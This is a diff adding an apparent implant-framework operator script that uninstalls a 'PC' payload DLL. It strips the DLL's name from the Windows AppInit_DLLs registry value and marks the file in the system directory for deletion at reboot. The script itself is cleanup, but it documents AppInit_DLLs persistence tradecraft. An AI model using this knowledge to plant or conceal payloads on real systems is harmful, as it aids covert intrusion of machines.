@@ -1,0 +1,102 @@
+
+@include "_File.dsi";
+@include "_Paths.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+@disablewow64 on;
+
+if ($argc != 1)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0]");
+	return false;
+}
+
+# get install name
+string $payloadName = "vldpkg.dll";
+if (!GetInput("PC DLL install name", $payloadName, $payloadName))
+{
+	echo("* Failed to get install name", ERROR);
+	return false;
+}
+
+string $payloadRegex = $payloadName;
+RegExSub("[.]", "\\.", $payloadRegex);
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+# make sure the file exists
+if (!_FileExists($payloadName, $syspath))
+{
+	echo("* Failed to find $syspath\\$payloadName", ERROR);
+	return false;
+}
+
+# get the AppInit value
+string $origAppInitValue;
+if (!_GetRegistryValue("L", 
+					   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+					   "AppInit_DLLs",
+					   $origAppInitValue) || !defined($origAppInitValue))
+{
+	$origAppInitValue = "";
+}
+
+if (!RegExMatch($payloadRegex, $origAppInitValue))
+{
+	echo("* Failed to find $payloadName in AppInit key", ERROR);
+	return false;
+}
+
+# remove name from key value
+@regex-global on;
+string $newAppInitValue = $origAppInitValue;
+if (!RegExSub($payloadRegex, "", $newAppInitValue))
+{
+	echo("* Failed to remove $payloadName from AppInit key value", ERROR);
+	return false;
+}
+
+# clean up key value (remove extra spaces)
+RegExSub("^\\s+", "", $newAppInitValue);
+RegExSub("\\s+\$", "", $newAppInitValue);
+RegExSub("\\s{2}", " ", $newAppInitValue);
+
+# update the registry key
+echo "Updating registry";
+if (!_SetRegistryValue("L", 
+					   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+					   "AppInit_DLLs",
+					   $newAppInitValue,
+					   "REG_SZ"))
+{
+	echo("    FAILED", ERROR);
+	pause;
+	return false;
+}
+echo("    SET", GOOD);
+
+echo "Deleting PC";
+if (!`delete -file "$sysPath\\$payloadName" -afterreboot`)
+{
+	echo("    FAILED", ERROR);
+}
+else
+{
+	echo("    MARKED FOR DELETION", GOOD);
+}
+
+echo "Uninstall Finished";
+echo "AppInit before : '$origAppInitValue'";
+echo " Appinit after : '$newAppInitValue'";
+
+pause;
+return true;
+
